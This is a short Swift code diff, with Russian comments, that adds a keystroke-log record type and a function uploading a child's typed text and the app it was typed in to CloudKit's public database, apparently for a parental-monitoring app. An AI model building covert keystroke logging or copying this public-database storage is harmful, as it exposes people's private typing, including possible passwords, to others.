@@ -1159,3 +1159,29 @@ extension CloudKitManager {
         }
     }
 }
+
+
+// Модель для хранения лога
+struct KeystrokeLog: Codable {
+    let text: String
+    let timestamp: Date
+    let appBundleID: String? // В каком приложении был сделан ввод
+}
+
+extension CloudKitManager {
+    /// Сохраняет порцию введенного текста в CloudKit
+    func saveKeystrokeLog(_ log: KeystrokeLog, for childID: String) async throws {
+        let record = CKRecord(recordType: "KeystrokeLog") // Новый тип записи
+        
+        record["text"] = log.text as CKRecordValue
+        record["timestamp"] = log.timestamp as CKRecordValue
+        record["targetChildID"] = childID as CKRecordValue
+        if let bundleID = log.appBundleID {
+            record["appBundleID"] = bundleID as CKRecordValue
+        }
+        
+        try await publicDatabase.save(record)
+    }
+}
+
+// Не забудьте создать тип записи `KeystrokeLog` в CloudKit Dashboard.
